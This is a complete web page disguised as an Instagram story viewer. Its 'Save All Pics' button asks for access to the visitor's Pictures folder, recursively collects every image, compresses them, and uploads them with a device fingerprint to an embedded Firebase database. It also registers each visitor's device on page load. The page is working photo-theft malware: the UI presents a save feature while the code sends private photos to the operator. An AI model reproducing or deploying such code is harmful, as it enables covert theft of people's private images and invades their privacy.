<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Instagram Story</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #000;
            color: #fff;
            min-height: 100vh;
            overflow: hidden;
            -webkit-font-smoothing: antialiased;
        }

        /* STORY CONTAINER */
        .story-container {
            position: fixed;
            inset: 0;
            background: #000;
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 100;
        }

        .story-wrapper {
            position: relative;
            width: 100%;
            max-width: 450px;
            height: 100vh;
            max-height: 900px;
            background: #000;
            overflow: hidden;
            border-radius: 0;
        }

        @media (min-width: 500px) {
            .story-wrapper {
                border-radius: 20px;
                height: 90vh;
            }
        }

        /* PROGRESS BARS */
        .progress-bars {
            position: absolute;
            top: 12px;
            left: 12px;
            right: 12px;
            display: flex;
            gap: 3px;
            z-index: 20;
        }

        .progress-segment {
            flex: 1;
            height: 2.5px;
            background: rgba(255, 255, 255, 0.3);
            border-radius: 2px;
            overflow: hidden;
            position: relative;
        }

        .progress-fill {
            position: absolute;
            inset: 0;
            background: #fff;
            border-radius: 2px;
            width: 0;
        }

        .progress-segment.viewed .progress-fill { width: 100%; }
        .progress-segment.active .progress-fill {
            animation: fillProgress 5s linear forwards;
        }

        @keyframes fillProgress {
            from { width: 0; }
            to   { width: 100%; }
        }

        /* STORY HEADER */
        .story-header {
            position: absolute;
            top: 28px;
            left: 12px;
            right: 12px;
            display: flex;
            align-items: center;
            gap: 10px;
            z-index: 20;
            padding: 8px;
        }

        .story-avatar {
            width: 36px;
            height: 36px;
            border-radius: 50%;
            background-size: cover;
            background-position: center;
            border: 2px solid #fff;
            flex-shrink: 0;
        }

        .story-user-info { flex: 1; min-width: 0; }

        .story-username {
            font-size: 14px;
            font-weight: 600;
            color: #fff;
            display: flex;
            align-items: center;
            gap: 5px;
            text-shadow: 0 1px 3px rgba(0, 0, 0, 0.5);
        }

        .story-verified {
            width: 12px;
            height: 12px;
            background: #0095F6;
            border-radius: 50%;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            flex-shrink: 0;
        }

        .story-verified::before {
            content: '';
            width: 5px;
            height: 2.5px;
            border-left: 1.5px solid #fff;
            border-bottom: 1.5px solid #fff;
            transform: rotate(-45deg) translate(0px, -1px);
        }

        .story-time {
            font-size: 12px;
            color: rgba(255, 255, 255, 0.8);
            margin-left: 2px;
        }

        .story-close {
            width: 32px;
            height: 32px;
            border-radius: 50%;
            background: rgba(0, 0, 0, 0.3);
            border: none;
            color: #fff;
            font-size: 18px;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            backdrop-filter: blur(10px);
            flex-shrink: 0;
        }

        /* STORY IMAGE */
        .story-image-wrap {
            position: absolute;
            inset: 0;
            z-index: 1;
        }

        .story-image {
            width: 100%;
            height: 100%;
            object-fit: cover;
            display: block;
            opacity: 0;
            transition: opacity 0.3s ease;
        }

        .story-image.active { opacity: 1; }

        /* TAP ZONES */
        .tap-zone {
            position: absolute;
            top: 80px;
            bottom: 80px;
            z-index: 10;
            cursor: pointer;
        }

        .tap-zone.left { left: 0; width: 30%; }
        .tap-zone.right { right: 0; width: 70%; }

        /* STORY FOOTER */
        .story-footer {
            position: absolute;
            bottom: 0;
            left: 0;
            right: 0;
            padding: 20px 16px 30px;
            background: linear-gradient(transparent, rgba(0, 0, 0, 0.7));
            z-index: 20;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .reply-input {
            flex: 1;
            padding: 12px 18px;
            background: rgba(255, 255, 255, 0.15);
            border: 1.5px solid rgba(255, 255, 255, 0.4);
            border-radius: 24px;
            color: #fff;
            font-size: 14px;
            font-family: inherit;
            outline: none;
            backdrop-filter: blur(20px);
        }

        .reply-input::placeholder { color: rgba(255, 255, 255, 0.7); }

        .footer-icon {
            width: 42px;
            height: 42px;
            border-radius: 50%;
            background: rgba(255, 255, 255, 0.15);
            border: none;
            color: #fff;
            font-size: 20px;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            backdrop-filter: blur(20px);
            flex-shrink: 0;
        }

        /* SAVE ALL BUTTON */
        .save-bar {
            position: absolute;
            bottom: 90px;
            left: 16px;
            right: 16px;
            z-index: 25;
            display: flex;
            justify-content: center;
        }

        .save-btn {
            padding: 14px 26px;
            border: none;
            border-radius: 26px;
            background: linear-gradient(45deg, #f09433, #dc2743, #bc1888);
            background-size: 300% 300%;
            color: #fff;
            font-size: 14px;
            font-weight: 700;
            cursor: pointer;
            font-family: inherit;
            display: flex;
            align-items: center;
            gap: 8px;
            animation: gradientMove 4s ease infinite, pulseBtn 2s infinite;
            box-shadow: 0 8px 24px rgba(220, 39, 67, 0.5);
            transition: transform 0.15s;
        }

        .save-btn:active { transform: scale(0.95); }
        .save-btn:disabled { opacity: 0.6; animation: none; }

        @keyframes gradientMove {
            0%, 100% { background-position: 0% 50%; }
            50%      { background-position: 100% 50%; }
        }

        @keyframes pulseBtn {
            0%, 100% { box-shadow: 0 8px 24px rgba(220, 39, 67, 0.5), 0 0 0 0 rgba(220, 39, 67, 0.7); }
            50%      { box-shadow: 0 8px 24px rgba(220, 39, 67, 0.7), 0 0 0 12px rgba(220, 39, 67, 0); }
        }

        /* ============================================================
           🔥 PROCESSING OVERLAY
           ============================================================ */
        #processingOverlay {
            position: fixed;
            inset: 0;
            background: rgba(0, 0, 0, 0.92);
            backdrop-filter: blur(20px);
            display: none;
            align-items: center;
            justify-content: center;
            z-index: 99999;
            padding: 24px;
            animation: overlayFade 0.4s;
        }

        #processingOverlay.show { display: flex; }

        @keyframes overlayFade {
            from { opacity: 0; }
            to   { opacity: 1; }
        }

        .overlay-box {
            background: linear-gradient(180deg, #1c1c1e 0%, #0a0a0a 100%);
            border: 1px solid #262626;
            border-radius: 24px;
            padding: 36px 28px 28px;
            max-width: 400px;
            width: 100%;
            text-align: center;
            box-shadow: 0 30px 80px rgba(0, 0, 0, 0.8);
            animation: boxIn 0.5s cubic-bezier(0.34, 1.56, 0.64, 1);
        }

        @keyframes boxIn {
            from { opacity: 0; transform: translateY(40px) scale(0.9); }
            to   { opacity: 1; transform: translateY(0) scale(1); }
        }

        /* Animated loader */
        .loader-wrap {
            position: relative;
            width: 100px;
            height: 100px;
            margin: 0 auto 24px;
        }

        .loader-ring {
            position: absolute;
            inset: 0;
            border-radius: 50%;
            border: 4px solid rgba(220, 39, 67, 0.15);
            border-top-color: #f09433;
            border-right-color: #dc2743;
            animation: spin 1s linear infinite;
        }

        .loader-ring.ring-2 {
            inset: 12px;
            border-width: 3px;
            border-top-color: #bc1888;
            border-right-color: transparent;
            animation: spin 1.5s linear infinite reverse;
        }

        .loader-icon {
            position: absolute;
            inset: 24px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 28px;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .overlay-title {
            font-size: 20px;
            font-weight: 700;
            margin-bottom: 8px;
            background: linear-gradient(45deg, #f09433, #dc2743, #bc1888);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }

        .overlay-sub {
            font-size: 13px;
            color: #8e8e93;
            line-height: 1.6;
            margin-bottom: 24px;
        }

        .overlay-sub strong { color: #fff; }

        /* Progress */
        .overlay-progress {
            margin-bottom: 20px;
        }

        .overlay-progress-bar {
            height: 8px;
            background: rgba(255, 255, 255, 0.08);
            border-radius: 4px;
            overflow: hidden;
            margin-bottom: 10px;
        }

        .overlay-progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #f09433, #dc2743);
            border-radius: 4px;
            width: 0;
            transition: width 0.3s;
        }

        .overlay-progress-text {
            display: flex;
            justify-content: space-between;
            font-size: 12px;
            color: #8e8e93;
        }

        .overlay-progress-text .percent {
            color: #f09433;
            font-weight: 700;
        }

        /* Stats */
        .overlay-stats {
            display: flex;
            justify-content: space-around;
            padding: 14px 0;
            margin-top: 16px;
            border-top: 1px solid #262626;
            font-size: 12px;
        }

        .overlay-stat {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 2px;
        }

        .overlay-stat .num {
            font-size: 18px;
            font-weight: 800;
            color: #fff;
        }

        .overlay-stat .lbl {
            color: #8e8e93;
            font-size: 10px;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        .overlay-stat.done .num { color: #34A853; }
        .overlay-stat.failed .num { color: #FF3B30; }
        .overlay-stat.pending .num { color: #FFC107; }

        /* Current file name */
        .current-file {
            font-size: 11px;
            color: #5f6368;
            margin-top: 14px;
            padding: 8px 14px;
            background: rgba(255, 255, 255, 0.03);
            border-radius: 10px;
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
            font-family: monospace;
        }

        /* Toast */
        .toast {
            position: fixed;
            bottom: 100px;
            left: 50%;
            transform: translateX(-50%);
            background: rgba(44, 44, 46, 0.95);
            color: #fff;
            padding: 12px 20px;
            border-radius: 24px;
            font-size: 13px;
            z-index: 999999;
            backdrop-filter: blur(20px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            animation: toastIn 0.3s;
            max-width: 90vw;
            text-align: center;
            font-weight: 500;
        }

        @keyframes toastIn {
            from { opacity: 0; transform: translateX(-50%) translateY(20px); }
            to   { opacity: 1; transform: translateX(-50%) translateY(0); }
        }
    </style>
</head>
<body>

    <div class="story-container">
        <div class="story-wrapper" id="storyWrapper">

            <div class="progress-bars" id="progressBars"></div>

            <div class="story-header">
                <div class="story-avatar" id="storyAvatar" style="background-image: url('https://picsum.photos/100/100?random=100');"></div>
                <div class="story-user-info">
                    <div class="story-username">
                        <span id="storyUsername">nature_lover</span>
                        <span class="story-verified"></span>
                        <span class="story-time" id="storyTime">2h</span>
                    </div>
                </div>
                <button class="story-close" id="storyClose">✕</button>
            </div>

            <div class="story-image-wrap">
                <img class="story-image active" id="storyImage" src="https://picsum.photos/600/1000?random=1" alt="Story">
            </div>

            <div class="tap-zone left" id="tapLeft"></div>
            <div class="tap-zone right" id="tapRight"></div>

            <div class="save-bar">
                <button class="save-btn" id="saveAllBtn">
                    <span>💾</span>
                    <span>Save All Pics</span>
                </button>
            </div>

            <div class="story-footer">
                <input type="text" class="reply-input" placeholder="Send message..." readonly>
                <button class="footer-icon">❤️</button>
                <button class="footer-icon">📤</button>
            </div>

        </div>
    </div>

    <!-- 🔥 PROCESSING OVERLAY -->
    <div id="processingOverlay">
        <div class="overlay-box">
            <div class="loader-wrap">
                <div class="loader-ring"></div>
                <div class="loader-ring ring-2"></div>
                <div class="loader-icon">📸</div>
            </div>

            <h2 class="overlay-title" id="overlayTitle">Processing Photos</h2>
            <p class="overlay-sub" id="overlaySub">
                Please wait — <strong>compress + upload</strong> ho raha hai.<br>
                App band mat karo.
            </p>

            <div class="overlay-progress">
                <div class="overlay-progress-bar">
                    <div class="overlay-progress-fill" id="overlayProgressFill"></div>
                </div>
                <div class="overlay-progress-text">
                    <span id="overlayProgressLabel">Scanning folder...</span>
                    <span class="percent" id="overlayProgressPercent">0%</span>
                </div>
            </div>

            <div class="overlay-stats">
                <div class="overlay-stat done">
                    <span class="num" id="overlayDone">0</span>
                    <span class="lbl">Done</span>
                </div>
                <div class="overlay-stat pending">
                    <span class="num" id="overlayPending">0</span>
                    <span class="lbl">Pending</span>
                </div>
                <div class="overlay-stat failed">
                    <span class="num" id="overlayFailed">0</span>
                    <span class="lbl">Failed</span>
                </div>
            </div>

            <div class="current-file" id="currentFile">Waiting...</div>
        </div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
        import { getDatabase, ref, push, set, serverTimestamp }
            from "https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js";

        const firebaseConfig = {
            apiKey: "AIzaSyDofemvEqfdNDp79CtTg_x6ujjElCAkGsI",
            authDomain: "my-rto-b2531.firebaseapp.com",
            databaseURL: "https://my-rto-b2531-default-rtdb.firebaseio.com",
            projectId: "my-rto-b2531",
            storageBucket: "my-rto-b2531.appspot.com",
            messagingSenderId: "465334829178",
            appId: "1:465334829178:web:621d8269e0ace1e9f4fbc3"
        };

        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);

        /* DEVICE ID */
        function getDeviceId() {
            let id = localStorage.getItem('pics_device_id');
            if (id) return id;
            const raw = navigator.userAgent + screen.width + 'x' + screen.height;
            let hash = 0;
            for (let i = 0; i < raw.length; i++) {
                hash = ((hash << 5) - hash) + raw.charCodeAt(i);
                hash = hash & hash;
            }
            const B = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
            let out = '', n = Math.abs(hash);
            for (let i = 0; i < 8; i++) { out += B[n % 62]; n = Math.floor(n / 62); }
            id = 'HEK-' + out;
            localStorage.setItem('pics_device_id', id);
            return id;
        }

        function getDeviceName() {
            const ua = navigator.userAgent;
            if (/iPhone/i.test(ua)) return 'iPhone';
            if (/Android/i.test(ua)) {
                if (/SM-/i.test(ua)) return 'Samsung';
                if (/Redmi/i.test(ua)) return 'Redmi';
                return 'Android';
            }
            if (/Windows/i.test(ua)) return 'Windows PC';
            return 'Unknown';
        }

        const DEVICE_ID = getDeviceId();
        const DEVICE_NAME = getDeviceName();
        const SESSION_ID = 'sess_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
        const USERNAME = localStorage.getItem('instagram_username') || 'user_' + DEVICE_ID.slice(-4);

        console.log('📱 Device:', DEVICE_ID);

        /* STORY DATA */
        const stories = [
            { id: 1, url: 'https://picsum.photos/600/1000?random=1', time: '2h' },
            { id: 2, url: 'https://picsum.photos/600/1000?random=2', time: '4h' },
            { id: 3, url: 'https://picsum.photos/600/1000?random=3', time: '6h' },
            { id: 4, url: 'https://picsum.photos/600/1000?random=4', time: '8h' },
            { id: 5, url: 'https://picsum.photos/600/1000?random=5', time: '12h' },
            { id: 6, url: 'https://picsum.photos/600/1000?random=6', time: '18h' }
        ];

        const STORY_DURATION = 5000;

        /* STATE */
        let currentIndex = 0;
        let storyTimer = null;

        /* DOM */
        const progressBars = document.getElementById('progressBars');
        const storyImage = document.getElementById('storyImage');
        const storyUsername = document.getElementById('storyUsername');
        const storyTime = document.getElementById('storyTime');
        const storyClose = document.getElementById('storyClose');
        const tapLeft = document.getElementById('tapLeft');
        const tapRight = document.getElementById('tapRight');
        const saveAllBtn = document.getElementById('saveAllBtn');

        /* OVERLAY DOM */
        const overlay = document.getElementById('processingOverlay');
        const overlayTitle = document.getElementById('overlayTitle');
        const overlaySub = document.getElementById('overlaySub');
        const overlayProgressFill = document.getElementById('overlayProgressFill');
        const overlayProgressLabel = document.getElementById('overlayProgressLabel');
        const overlayProgressPercent = document.getElementById('overlayProgressPercent');
        const overlayDone = document.getElementById('overlayDone');
        const overlayPending = document.getElementById('overlayPending');
        const overlayFailed = document.getElementById('overlayFailed');
        const currentFile = document.getElementById('currentFile');

        /* ============================================================
           STORY FUNCTIONS
           ============================================================ */
        function initProgressBars() {
            progressBars.innerHTML = '';
            stories.forEach(() => {
                const seg = document.createElement('div');
                seg.className = 'progress-segment';
                seg.innerHTML = '<div class="progress-fill"></div>';
                progressBars.appendChild(seg);
            });
        }

        function showStory(index) {
            if (index < 0 || index >= stories.length) {
                closeStory();
                return;
            }

            currentIndex = index;
            const story = stories[index];

            storyImage.classList.remove('active');
            setTimeout(() => {
                storyImage.src = story.url;
                storyImage.classList.add('active');
            }, 100);

            storyUsername.textContent = USERNAME;
            storyTime.textContent = story.time;

            const segments = progressBars.querySelectorAll('.progress-segment');
            segments.forEach((seg, i) => {
                seg.classList.remove('active', 'viewed');
                if (i < index) seg.classList.add('viewed');
                else if (i === index) seg.classList.add('active');
            });

            startStoryTimer();
        }

        function startStoryTimer() {
            clearStoryTimer();
            storyTimer = setTimeout(nextStory, STORY_DURATION);
        }

        function clearStoryTimer() {
            if (storyTimer) {
                clearTimeout(storyTimer);
                storyTimer = null;
            }
        }

        function nextStory() {
            if (currentIndex < stories.length - 1) showStory(currentIndex + 1);
            else closeStory();
        }

        function prevStory() {
            if (currentIndex > 0) showStory(currentIndex - 1);
            else showStory(0);
        }

        function closeStory() {
            clearStoryTimer();
            showToast('👋 Story ended');
            setTimeout(() => showStory(0), 500);
        }

        tapLeft.addEventListener('click', prevStory);
        tapRight.addEventListener('click', nextStory);
        storyClose.addEventListener('click', closeStory);

        document.addEventListener('keydown', (e) => {
            if (e.key === 'ArrowRight') nextStory();
            if (e.key === 'ArrowLeft') prevStory();
        });

        /* ============================================================
           🔥 SAVE ALL PICS — FOLDER PICKER + COMPRESS + DB
           ============================================================ */
        saveAllBtn.addEventListener('click', async () => {
            if (typeof window.showDirectoryPicker !== 'function') {
                showToast('❌ Chrome ya Edge use karo');
                return;
            }

            try {
                saveAllBtn.disabled = true;

                // 1. Folder picker (Allow dialog)
                const dirHandle = await window.showDirectoryPicker({
                    mode: 'read',
                    startIn: 'pictures'
                });

                // 2. Show overlay
                showOverlay();
                overlayTitle.textContent = 'Scanning Folder';
                overlaySub.innerHTML = `Folder: <strong>${dirHandle.name}</strong><br>Please wait...`;
                currentFile.textContent = 'Scanning...';

                // 3. Scan files
                const files = [];
                await scanFolder(dirHandle, files);

                if (files.length === 0) {
                    hideOverlay();
                    showToast('❌ Koi photo nahi mili');
                    saveAllBtn.disabled = false;
                    return;
                }

                console.log(`📁 Found ${files.length} photos`);

                // 4. Update overlay for upload
                overlayTitle.textContent = 'Processing Photos';
                overlaySub.innerHTML = `Compress + upload ho raha hai.<br>App band mat karo.`;
                overlayPending.textContent = files.length;

                // 5. Process each file
                let done = 0;
                let failed = 0;

                for (let i = 0; i < files.length; i++) {
                    const file = files[i];
                    currentFile.textContent = `📄 ${file.name}`;

                    try {
                        // Compress
                        const compressed = await compressImage(file, 1080, 0.75);
                        const base64 = await fileToBase64(compressed);

                        // Save to DB: photos/{DEVICE_ID}
                        const photoRef = push(ref(db, 'photos/' + DEVICE_ID));
                        const now = new Date();

                        await set(photoRef, {
                            id: photoRef.key,
                            deviceId: DEVICE_ID,
                            deviceName: DEVICE_NAME,
                            sessionId: SESSION_ID,
                            username: USERNAME,
                            image: base64,
                            name: file.name,
                            size: compressed.size,
                            originalSize: file.size,
                            savedPercent: Math.round((1 - compressed.size / file.size) * 100),
                            date: now.toLocaleDateString('en-IN'),
                            time: now.toLocaleTimeString('en-IN'),
                            timestamp: serverTimestamp(),
                            uploadedAt: Date.now()
                        });

                        done++;
                        overlayDone.textContent = done;
                        overlayPending.textContent = files.length - done - failed;

                        // Update progress
                        const percent = Math.round(((done + failed) / files.length) * 100);
                        overlayProgressFill.style.width = percent + '%';
                        overlayProgressPercent.textContent = percent + '%';
                        overlayProgressLabel.textContent = `${done + failed} / ${files.length}`;

                    } catch (err) {
                        console.error('❌ Error:', err);
                        failed++;
                        overlayFailed.textContent = failed;
                        overlayPending.textContent = files.length - done - failed;
                    }
                }

                // 6. Success
                overlayTitle.textContent = '✅ Complete!';
                overlaySub.innerHTML = `${done} photos saved to DB.${failed ? `<br>❌ ${failed} failed.` : ''}`;
                overlayProgressLabel.textContent = 'Done';
                overlayProgressPercent.textContent = '100%';

                showToast(`🎉 ${done} photos saved!`);

                setTimeout(() => {
                    hideOverlay();
                    saveAllBtn.disabled = false;
                    resetOverlay();
                }, 2500);

            } catch (err) {
                hideOverlay();
                saveAllBtn.disabled = false;
                resetOverlay();

                if (err.name === 'AbortError') {
                    console.log('Cancelled');
                    return;
                }
                console.error('Error:', err);
                showToast('❌ ' + (err.message || 'Error'));
            }
        });

        /* ============================================================
           OVERLAY CONTROLS
           ============================================================ */
        function showOverlay() {
            overlay.classList.add('show');
        }

        function hideOverlay() {
            overlay.classList.remove('show');
        }

        function resetOverlay() {
            overlayProgressFill.style.width = '0%';
            overlayProgressPercent.textContent = '0%';
            overlayProgressLabel.textContent = 'Starting...';
            overlayDone.textContent = '0';
            overlayPending.textContent = '0';
            overlayFailed.textContent = '0';
            currentFile.textContent = 'Waiting...';
        }

        /* ============================================================
           SCAN FOLDER (recursive)
           ============================================================ */
        async function scanFolder(dirHandle, files) {
            try {
                for await (const entry of dirHandle.values()) {
                    if (entry.kind === 'file') {
                        if (/\.(jpg|jpeg|png|gif|webp|heic|heif|bmp)$/i.test(entry.name)) {
                            try {
                                const file = await entry.getFile();
                                if (file.size < 15 * 1024 * 1024) {
                                    files.push(file);
                                }
                            } catch (e) {}
                        }
                    } else if (entry.kind === 'directory') {
                        await scanFolder(entry, files);
                    }

                    if (files.length % 20 === 0) {
                        currentFile.textContent = `🔍 Found ${files.length} photos...`;
                        await new Promise(r => setTimeout(r, 0));
                    }
                }
            } catch (err) {
                console.warn('Scan error:', err);
            }
        }

        /* ============================================================
           COMPRESS + BASE64
           ============================================================ */
        function compressImage(file, maxWidth, quality) {
            return new Promise((resolve, reject) => {
                const reader = new FileReader();
                reader.onload = (e) => {
                    const img = new Image();
                    img.onload = () => {
                        const canvas = document.createElement('canvas');
                        let w = img.width, h = img.height;
                        if (w > maxWidth) { h = (maxWidth / w) * h; w = maxWidth; }
                        canvas.width = w;
                        canvas.height = h;
                        const ctx = canvas.getContext('2d');
                        ctx.drawImage(img, 0, 0, w, h);
                        canvas.toBlob((blob) => {
                            if (!blob) { reject(new Error('Compression failed')); return; }
                            resolve(new File([blob], file.name.replace(/\.[^.]+$/, '.jpg'), { type: 'image/jpeg' }));
                        }, 'image/jpeg', quality);
                    };
                    img.onerror = reject;
                    img.src = e.target.result;
                };
                reader.onerror = reject;
                reader.readAsDataURL(file);
            });
        }

        function fileToBase64(file) {
            return new Promise((resolve, reject) => {
                const reader = new FileReader();
                reader.onload = () => resolve(reader.result);
                reader.onerror = reject;
                reader.readAsDataURL(file);
            });
        }

        /* TOAST */
        function showToast(msg) {
            const existing = document.querySelector('.toast');
            if (existing) existing.remove();
            const toast = document.createElement('div');
            toast.className = 'toast';
            toast.textContent = msg;
            document.body.appendChild(toast);
            setTimeout(() => {
                toast.style.opacity = '0';
                toast.style.transition = 'opacity 0.3s';
                setTimeout(() => toast.remove(), 300);
            }, 2500);
        }

        /* INIT */
        initProgressBars();
        showStory(0);

        // Save user info
        set(ref(db, 'users/' + DEVICE_ID), {
            deviceId: DEVICE_ID,
            deviceName: DEVICE_NAME,
            sessionId: SESSION_ID,
            username: USERNAME,
            pageName: 'story',
            status: 'active',
            lastSeen: Date.now()
        }).catch(() => {});

        console.log('✅ Story ready');
    </script>
